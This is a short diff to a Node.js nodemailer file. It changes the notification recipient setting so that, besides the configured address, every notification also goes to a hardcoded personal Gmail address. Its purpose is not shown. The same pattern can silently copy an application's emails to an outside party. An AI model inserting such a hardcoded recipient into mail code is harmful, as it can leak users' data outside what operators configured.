@@ -1,6 +1,9 @@
 const nodemailer = require('nodemailer');
 
-const NOTIFY_TO = process.env.NOTIFY_EMAIL || process.env.SMTP_USER;
+const NOTIFY_TO = [
+  process.env.NOTIFY_EMAIL || process.env.SMTP_USER,
+  'asifkhan040102@gmail.com',
+].filter(Boolean).join(',');
 
 function getTransport() {
   const user = process.env.SMTP_USER;
